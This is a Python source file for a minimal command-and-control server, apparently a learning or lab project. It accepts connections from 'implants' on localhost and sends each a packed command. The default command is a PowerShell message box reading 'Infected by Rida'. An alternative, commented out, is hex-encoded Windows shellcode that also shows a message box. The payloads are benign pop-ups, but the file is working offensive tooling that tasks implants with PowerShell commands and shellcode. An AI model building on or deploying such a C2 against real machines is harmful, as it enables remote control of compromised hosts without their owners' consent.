import struct, socket
import threading
from time import sleep

#Default MessageBox as PWSH padded on 1024 bytes
defaultCmdData = b"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')".ljust(1024, b"\x00")
#default shellcode Messagebox
defaultShellCode = bytes.fromhex("fc4881e4f0ffffffe8cc00000041514150524831d2515665488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d050448b40208b48184901d0e35648ffc9418b34884801d64d31c94831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5de80b0000007573657233322e646c6c005941ba4c772607ffd549c7c100000000e811000000496e6a65637465642062792052696461005ae80600000050776e65640041584831c941ba45835607ffd5bbe01d2a0a41baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5").ljust(1024, b"\x00")


class C2:
    def __init__(self):
        self.host = "127.0.0.1"
        self.port = 8888

        self.activeimplant = []
        self.implantcount = 0
        self.maximplant = 50
        self.lock = threading.Lock()
    
    def remove_implant(self, implant):
        with self.lock:
            if implant in self.activeimplant:
                self.activeimplant.remove(implant)
                print(f"[C2 - Server] Implant {implant.implant_id} removed (active={len(self.activeimplant)})")
                self.implantcount -= 1
            else:
                print(f"[C2 - Server][WARN] Implant {implant.implant_id} not found in active list")
    
    def startC2(self):
        print("[C2 - Server] C2 server succesfully started")
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.bind((self.host, self.port))
        self.server_sock.listen(self.maximplant)
        self.server_sock.setblocking(False)
        print(f"[C2 - Server] C2 server listening on {self.host}:{self.port}")
        try :
            while 1:
                try:
                    implant_sock, addr = self.server_sock.accept()
                except BlockingIOError:
                    sleep(0.05)   # évite le CPU 100%
                    continue
                print("[C2 - Server] New implant reached the C2 !")
                implant_id = self.implantcount
                print(f"[C2 - Server] Implant id : {implant_id} | Implant IP {addr}")
                self.activeimplant.append(Implant(implant_id, implant_sock, self))
                self.implantcount += 1
        except KeyboardInterrupt : 
            self.server_sock.close()


class Implant(threading.Thread):
    def __init__(self, implant_id: int, implant_sock: socket, context: C2):
        threading.Thread.__init__(self)
        self.implant_id = implant_id
        self.implant_sock = implant_sock
        self.context = context
        self.active = 1

        self.start()
    
    def run(self):
        try:
            self.SendImplant(1, defaultCmdData) 
            #self.SendImplant(2, defaultShellCode)
        finally:
            self.implant_sock.close()
            self.context.remove_implant(self)


    def SendImplant(self, cmdId:int, Data:bytes):
        c2_pkt = struct.pack("<I1024s", cmdId, Data)

        print(f"[C2 - Server] Sending Implant {self.implant_id} CmdId : {cmdId}")
        self.implant_sock.sendall(c2_pkt)

if __name__ == "__main__":
    rzdhopC2 = C2()

    rzdhopC2.startC2()



